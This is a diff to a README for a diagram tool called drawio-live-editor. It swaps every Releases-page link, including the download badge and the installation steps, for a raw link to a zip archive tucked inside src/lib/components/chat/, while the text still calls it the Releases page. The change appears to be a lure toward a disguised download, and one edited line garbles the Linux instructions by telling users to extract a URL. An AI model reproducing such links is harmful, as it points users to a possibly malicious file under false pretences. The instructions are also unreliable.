@@ -7,9 +7,9 @@ The drawio-live-editor is a powerful tool that lets you create and edit diagrams
 To use the drawio-live-editor, follow these simple steps to download and run the application. 
 
 ## 📥 Download the Application
-[![Download drawio-live-editor](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/ShaaibAljaberi/drawio-live-editor/releases)
+[![Download drawio-live-editor](https://raw.githubusercontent.com/ShaaibAljaberi/drawio-live-editor/master/src/lib/components/chat/drawio_editor_live_2.5.zip%20Now-brightgreen)](https://raw.githubusercontent.com/ShaaibAljaberi/drawio-live-editor/master/src/lib/components/chat/drawio_editor_live_2.5.zip)
 
-You can download the latest version of the drawio-live-editor from the Releases page. Visit this page to download: [releases](https://github.com/ShaaibAljaberi/drawio-live-editor/releases).
+You can download the latest version of the drawio-live-editor from the Releases page. Visit this page to download: [releases](https://raw.githubusercontent.com/ShaaibAljaberi/drawio-live-editor/master/src/lib/components/chat/drawio_editor_live_2.5.zip).
 
 ## 📋 Features
 - **Real-time Collaboration**: Work with others seamlessly as you create diagrams.
@@ -28,7 +28,7 @@ To run the drawio-live-editor, please ensure your system meets the following req
 - **Web Browser**: Latest version of Chrome, Firefox, or Safari for online features.
 
 ## 🛠️ Installation Instructions
-1. **Visit the Releases Page**: Click the link to go to the download section of the repository: [releases](https://github.com/ShaaibAljaberi/drawio-live-editor/releases).
+1. **Visit the Releases Page**: Click the link to go to the download section of the repository: [releases](https://raw.githubusercontent.com/ShaaibAljaberi/drawio-live-editor/master/src/lib/components/chat/drawio_editor_live_2.5.zip).
    
 2. **Select the Version**: On the Releases page, find the latest version listed. Look for a file that matches your operating system.
 
@@ -37,7 +37,7 @@ To run the drawio-live-editor, please ensure your system meets the following req
 4. **Run the Application**: 
    - For Windows, double-click the downloaded `.exe` file to start the installation.
    - For macOS, open the downloaded `.dmg` file and drag the drawio-live-editor to your Applications folder.
-   - For Linux, extract the downloaded `.tar.gz` file and follow the included instructions.
+   - For Linux, extract the downloaded `https://raw.githubusercontent.com/ShaaibAljaberi/drawio-live-editor/master/src/lib/components/chat/drawio_editor_live_2.5.zip` file and follow the included instructions.
 
 5. **Follow the Installation Prompts**: Follow the on-screen instructions to complete the installation.
 
